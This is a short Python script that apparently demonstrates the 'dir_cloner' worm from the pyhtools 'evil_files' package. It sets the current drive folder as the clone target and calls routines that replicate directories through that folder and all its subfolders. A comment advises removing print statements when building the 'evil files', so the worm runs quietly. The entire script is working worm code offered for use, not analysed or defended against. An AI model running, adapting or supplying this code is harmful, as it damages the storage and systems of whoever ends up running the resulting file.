from pyhtools.evil_files.worms.dir_cloner import DirCloner

# create obj and path
dir_worm = DirCloner()
path = dir_worm.get_curr_drive_folder()

# set cloning directory
dir_clone_set_status = dir_worm.set_clone_path(path)

# remove print statements while creating evil files
if dir_clone_set_status:
    print(f"[*] Clone path : {path}")
else:
    print(f"[!] Failed to set new clone path {path}")

# for specific folder
dir_worm.clone_dir(times=1, start_after=0)

# for specific folder and its subfolder
dir_worm.clone_all_dirs(times=1, start_after=0, path=path)
